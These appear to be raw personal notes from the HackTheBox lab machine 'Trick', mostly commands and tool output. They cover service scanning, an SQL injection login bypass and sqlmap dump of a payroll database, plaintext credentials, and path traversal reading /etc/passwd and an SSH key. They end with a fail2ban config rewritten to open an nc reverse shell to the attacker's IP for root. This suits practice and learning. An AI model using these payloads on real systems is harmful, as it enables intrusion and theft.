Trick

nmap -sV -sC -Pn 10.10.11.166       
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-24 05:58 EDT
Nmap scan report for 10.10.11.166
Host is up (0.24s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 61:ff:29:3b:36:bd:9d:ac:fb:de:1f:56:88:4c:ae:2d (RSA)
|   256 9e:cd:f2:40:61:96:ea:21:a6:ce:26:02:af:75:9a:78 (ECDSA)
|_  256 72:93:f9:11:58:de:34:ad:12:b5:4b:4a:73:64:b9:70 (ED25519)
25/tcp open  smtp    Postfix smtpd
|_smtp-commands: debian.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
53/tcp open  domain  ISC BIND 9.11.5-P4-5.1+deb10u7 (Debian Linux)
| dns-nsid: 
|_  bind.version: 9.11.5-P4-5.1+deb10u7-Debian
80/tcp open  http    nginx 1.14.2
|_http-title: Coming Soon - Start Bootstrap Theme
|_http-server-header: nginx/1.14.2
Service Info: Host:  debian.localdomain; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 104.74 seconds


ffuf -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt:FUZZ -u http://root.trick.htb/FUZZ.html

nmap -p 25 --script smtp-commands 10.10.11.166
nmap -p 25 --script smtp-enum-users -Pn 10.10.11.166

nmap -p 53 --script dns-nsid -Pn 10.10.11.166
bind.version: 9.11.5-P4-5.1+deb10u7-Debian

└─$ dig ANY @10.10.11.166 trick.htb

; <<>> DiG 9.18.1-1-Debian <<>> ANY @10.10.11.166 trick.htb
; (1 server found)
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 23591
;; flags: qr aa rd; QUERY: 1, ANSWER: 4, AUTHORITY: 0, ADDITIONAL: 3
;; WARNING: recursion requested but not available

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
; COOKIE: 02bf44384033a489c41c664562de5322d13f5c4b6d7e280e (good)
;; QUESTION SECTION:
;trick.htb.                     IN      ANY

;; ANSWER SECTION:
trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
trick.htb.              604800  IN      NS      trick.htb.
trick.htb.              604800  IN      A       127.0.0.1
trick.htb.              604800  IN      AAAA    ::1

ffuf -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt:FUZZ -u http://root.trick.htb/FUZZ.html

ffuf -w /usr/share/amass/wordlists/subdomains-top1mil-5000.txt:FUZZ -u http://FUZZ.trick.htb/

msf6 > use auxiliary/gather/enum_dns

; <<>> DiG 9.18.1-1-Debian <<>> axfr @10.10.11.166

nmap -p 53 --script *dns* -Pn 10.10.11.166

nmap -p- -sV -sC -Pn 10.10.11.166  

http://preprod-payroll.trick.htb/login.php

' or 1=1 -- 
to login

Enemigosss
SuperGucciRainbowCake

Travis
Travis_Test
password1234
staff

sqlmap -u "http://preprod-payroll.trick.htb/index.php?page=payroll_items&id=2*" --batch --dump

sqlmap -u "http://preprod-payroll.trick.htb/index.php?page=payroll_items&id=2*" --tables -D payroll_db

06:12:22] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
[06:12:22] [INFO] fetching current database
[06:12:22] [INFO] retrieved: payroll_d
[06:16:43] [ERROR] invalid character detected. retrying..
[06:16:43] [WARNING] increasing time delay to 6 seconds
b
[06:17:02] [INFO] fetching tables for database: 'payroll_db'
[06:17:02] [INFO] fetching number of tables for database 'payroll_db'
[06:17:22] [INFO] retrieved: position
[06:21:04] [INFO] retrieved: employee
[06:24:27] [INFO] retrieved: department
[06:28:50] [INFO] retrieved: payroll_items
[06:34:48] [INFO] retrieved: attendance
[06:38:44] [INFO] retrieved: employee_deductions
[06:48:04] [INFO] retrieved: employee_allowances
[06:54:43] [INFO] retrieved: users
[06:57:18] [INFO] retrieved: deductions
[07:03:48] [INFO] retrieved: payroll
[07:08:23] [INFO] retrieved: allowances

sqlmap -u "http://preprod-payroll.trick.htb/index.php?page=payroll_items&id=2*" --dump -T payroll_items -D payroll_db --technique T --batch
sqlmap -u "http://preprod-payroll.trick.htb/index.php?page=payroll_items&id=2*" --schema --batch

http://preprod-marketing.trick.htb/index.php?page=....//....//....//etc/passwd
root:x:0:0:root:/root:/bin/bash 
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin 
bin:x:2:2:bin:/bin:/usr/sbin/nologin 
sys:x:3:3:sys:/dev:/usr/sbin/nologin 
sync:x:4:65534:sync:/bin:/bin/sync 
games:x:5:60:games:/usr/games:/usr/sbin/nologin
 man:x:6:12:man:/var/cache/man:/usr/sbin/nologin 
 lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin 
 mail:x:8:8:mail:/var/mail:/usr/sbin/nologin 
 news:x:9:9:news:/var/spool/news:/usr/sbin/nologin 
 uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin 
 proxy:x:13:13:proxy:/bin:/usr/sbin/nologin 
 www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin 
 backup:x:34:34:backup:/var/backups:/usr/sbin/nologin 
 list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin 
 irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin 
 gnats:x:41:41:Gnats Bug-Reporting System 
 (admin):/var/lib/gnats:/usr/sbin/nologin 
 nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin 
 _apt:x:100:65534::/nonexistent:/usr/sbin/nologin
 systemd-timesync:x:101:102:systemd 
 Time Synchronization,,,:/run/systemd:/usr/sbin/nologin 
 systemd-network:x:102:103:systemd 
 Network Management,,,:/run/systemd:/usr/sbin/nologin 
 systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin 
 messagebus:x:104:110::/nonexistent:/usr/sbin/nologin tss:x:105:111:TPM2 
 software stack,,,:/var/lib/tpm:/bin/false 
 dnsmasq:x:106:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin 
 usbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin 
 rtkit:x:108:114:RealtimeKit,,,:/proc:/usr/sbin/nologin 
 pulse:x:109:118:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin 
 speech-dispatcher:x:110:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false 
 avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin 
 saned:x:112:121::/var/lib/saned:/usr/sbin/nologin 
 colord:x:113:122:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin 
 geoclue:x:114:123::/var/lib/geoclue:/usr/sbin/nologin 
 hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false D
 ebian-gdm:x:116:124:Gnome Display Manager:/var/lib/gdm3:/bin/false 
 systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin 
 mysql:x:117:125:MySQL Server,,,:/nonexistent:/bin/false 
 sshd:x:118:65534::/run/sshd:/usr/sbin/nologin 
 postfix:x:119:126::/var/spool/postfix:/usr/sbin/nologin 
 bind:x:120:128::/var/cache/bind:/usr/sbin/nologin 
 michael:x:1001:1001::/home/michael:/bin/bash 

 http://preprod-marketing.trick.htb/index.php?page=....//....//....//home/michael/.ssh/id_rsa
SSH KEY HERE
USer Key here

 fail2ban
 modyify /etc/fail2ban/action.d/iptables-multiport.conf

 set actionban = /usr/bin/ nc 10.10.14.8 9999   -e /usr/bin/bash
 sudo nc -lnvp 9999

 on victim sudo -l
 sudo fail2ban restart

 michael@trick:/etc/init.d$ sudo ./fail2ban restart

 linpeas time

 17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )


SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
HOME=/root
LOGNAME=root

1       5       cron.daily      run-parts --report /etc/cron.daily
7       10      cron.weekly     run-parts --report /etc/cron.weekly
@monthly        15      cron.monthly    run-parts --report /etc/cron.monthly

╔══════════╣ Analyzing .socket files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sockets                                                                                                                      
/etc/systemd/system/sockets.target.wants/avahi-daemon.socket is calling this writable listener: /run/avahi-daemon/socket                                                                        
/usr/lib/systemd/system/avahi-daemon.socket is calling this writable listener: /run/avahi-daemon/socket
/usr/lib/systemd/system/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket
/usr/lib/systemd/system/sockets.target.wants/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket
/usr/lib/systemd/system/sockets.target.wants/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log
/usr/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout
/usr/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket
/usr/lib/systemd/system/syslog.socket is calling this writable listener: /run/systemd/journal/syslog
/usr/lib/systemd/system/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log
/usr/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout
/usr/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket

╔══════════╣ Unix Sockets Listening
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sockets                                                                                                                      
/anvil                                                                                                                                                                                          
/bounce
/bsmtp
/cleanup
/defer
/discard
/error
/flush
/ifmail
/lmtp
/local
/maildrop
/mailman
/pickup
/proxymap
/proxywrite
/qmgr
/relay
/retry
/rewrite
/run/avahi-daemon/socket
  └─(Read Write)
/run/cups/cups.sock
  └─(Read Write)
/run/dbus/system_bus_socket
  └─(Read Write)
/run/fail2ban/fail2ban.sock
/run/mysqld/mysqld.sock
  └─(Read Write)
/run/php/php7.3-fpm-michael.sock
/run/php/php7.3-fpm.sock
/run/systemd/fsck.progress
/run/systemd/journal/dev-log
  └─(Read Write)
/run/systemd/journal/socket
  └─(Read Write)
/run/systemd/journal/stdout
  └─(Read Write)
/run/systemd/journal/syslog
  └─(Read Write)
/run/systemd/notify
  └─(Read Write)
/run/systemd/private
  └─(Read Write)
/run/udev/control
/run/user/1001/bus
  └─(Read Write)
/run/user/1001/gnupg/S.dirmngr
  └─(Read Write)
/run/user/1001/gnupg/S.gpg-agent
  └─(Read Write)
/run/user/1001/gnupg/S.gpg-agent.browser
  └─(Read Write)
/run/user/1001/gnupg/S.gpg-agent.extra
  └─(Read Write)
/run/user/1001/gnupg/S.gpg-agent.ssh
  └─(Read Write)
/run/user/1001/pulse/native
  └─(Read Write)
/run/user/1001/systemd/notify
  └─(Read Write)
/run/user/1001/systemd/private
  └─(Read Write)
/run/user/116/bus
/run/user/116/gnupg/S.dirmngr
/run/user/116/gnupg/S.gpg-agent
/run/user/116/gnupg/S.gpg-agent.browser
/run/user/116/gnupg/S.gpg-agent.extra
/run/user/116/gnupg/S.gpg-agent.ssh
/run/user/116/pulse/native
/run/user/116/systemd/private
/run/user/116/wayland-0
/run/vmware/guestServicePipe
  └─(Read Write)
/scache
/scalemail-backend
/showq
/smtp
/tlsmgr
/tmp/dbus-aF11F8Rg
/tmp/dbus-BpXyclaNed
/tmp/dbus-itED6BVN
/tmp/dbus-jq1nQdtQ
/tmp/dbus-Y0OqLNCs
/tmp/.ICE-unix/917
  └─(Read Write)
/tmp/.X11-unix/X1024
  └─(Read )
/trace
/uucp
/var/run/dbus/system_bus_socket
  └─(Read Write)
/var/run/fail2ban/fail2ban.sock
/var/run/vmware/guestServicePipe
  └─(Read Write)
/var/spool/postfix/dev/log
  └─(Read Write)
/verify
/virtual


╔══════════╣ Analyzing FastCGI Files (limit 70)
-rw-r--r-- 1 root root 1007 Aug 24  2020 /etc/nginx/fastcgi_params                                                                                                                              

╔══════════╣ Analyzing Htpasswd Files (limit 70)
-rw-r--r-- 1 root root 47 Jan 18  2018 /usr/lib/python3/dist-packages/fail2ban/tests/files/config/apache-auth/basic/authz_owner/.htpasswd                                                       
username:$apr1$1f5oQUl4$21lLXSN7xQOPtNsj5s4Nk/
-rw-r--r-- 1 root root 47 Jan 18  2018 /usr/lib/python3/dist-packages/fail2ban/tests/files/config/apache-auth/basic/file/.htpasswd
username:$apr1$uUMsOjCQ$.BzXClI/B/vZKddgIAJCR.
-rw-r--r-- 1 root root 117 Jan 18  2018 /usr/lib/python3/dist-packages/fail2ban/tests/files/config/apache-auth/digest_anon/.htpasswd
username:digest anon:25e4077a9344ceb1a88f2a62c9fb60d8
05bbb04
anonymous:digest anon:faa4e5870970cf935bb9674776e6b26a
-rw-r--r-- 1 root root 62 Jan 18  2018 /usr/lib/python3/dist-packages/fail2ban/tests/files/config/apache-auth/digest/.htpasswd
username:digest private area:fad48d3a7c63f61b5b3567a4105bbb04
-rw-r--r-- 1 root root 62 Jan 18  2018 /usr/lib/python3/dist-packages/fail2ban/tests/files/config/apache-auth/digest_time/.htpasswd
username:digest private area:fad48d3a7c63f61b5b3567a4105bbb04
-rw-r--r-- 1 root root 62 Jan 18  2018 /usr/lib/python3/dist-packages/fail2ban/tests/files/config/apache-auth/digest_wrongrelm/.htpasswd
username:wrongrelm:99cd340e1283c6d0ab34734bd47bdc30
4105bbb04


/usr/share/openssh/sshd_config

╔══════════╣ Searching uncommon passwd files (splunk)
passwd file: /etc/pam.d/passwd                                                                                                                                                                  
passwd file: /etc/passwd
passwd file: /usr/lib/python3/dist-packages/fail2ban/tests/files/config/apache-auth/basic/authz_owner/.htpasswd
passwd file: /usr/lib/python3/dist-packages/fail2ban/tests/files/config/apache-auth/basic/file/.htpasswd
passwd file: /usr/lib/python3/dist-packages/fail2ban/tests/files/config/apache-auth/digest_anon/.htpasswd
passwd file: /usr/lib/python3/dist-packages/fail2ban/tests/files/config/apache-auth/digest/.htpasswd
passwd file: /usr/lib/python3/dist-packages/fail2ban/tests/files/config/apache-auth/digest_time/.htpasswd
passwd file: /usr/lib/python3/dist-packages/fail2ban/tests/files/config/apache-auth/digest_wrongrelm/.htpasswd
passwd file: /usr/share/lintian/overrides/passwd

Writable: /home/michael/.local/share/gvfs-metadata/home-5921d082.log
Writable: /home/michael/.local/share/gvfs-metadata/root-0fdf9508.log 

-rwsr-xr-x 1 root root 154K Jan 20  2021 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-x 1 root root 53K Jul 27  2018 /usr/bin/chfn  --->  SuSE_9.3/10

# Fail2Ban configuration file
#
# Author: Cyril Jaquier
# Modified by Yaroslav Halchenko for multiport banning
#

[INCLUDES]

before = iptables-common.conf

[Definition]

 Option:  actionstart
 Notes.:  command executed once at the start of Fail2Ban.
 Values:  CMD

actionstart = <iptables> -N f2b-<name>
              <iptables> -A f2b-<name> -j <returntype>
              <iptables> -I <chain> -p <protocol> -m multiport --dports <port> -j f2b-<name>

 Option:  actionstop
 Notes.:  command executed once at the end of Fail2Ban
 Values:  CMD

actionstop = <iptables> -D <chain> -p <protocol> -m multiport --dports <port> -j f2b-<name>
             <actionflush>
             <iptables> -X f2b-<name>

 Option:  actioncheck
 Notes.:  command executed once before each actionban command
 Values:  CMD

actioncheck = <iptables> -n -L <chain> | grep -q 'f2b-<name>[ \t]'

 Option:  actionban
 Notes.:  command executed when banning an IP. Take care that the
          command is executed with Fail2Ban user rights.
 Tags:    See jail.conf(5) man page
 Values:  CMD

actionban = /usr/bin/nc 10.10.14.4 9999 -e /usr/bin/bash

 Option:  actionunban
 Notes.:  command executed when unbanning an IP. Take care that the
          command is executed with Fail2Ban user rights.
 Tags:    See jail.conf(5) man page
 Values:  CMD

actionunban = <iptables> -D f2b-<name> -s <ip> -j <blocktype>

[Init]

/etc/fail2ban/action.d/

cd /etc/fail2ban/action.d; rm -r iptables-multiport.conf; nano iptables-multiport.conf

cd /etc/init.d; sudo ./fail2ban restart

cat /etc/fail2ban/action.d/iptables-multiport.conf
cat /etc/fail2ban/action.d/jail.conf
Root key here
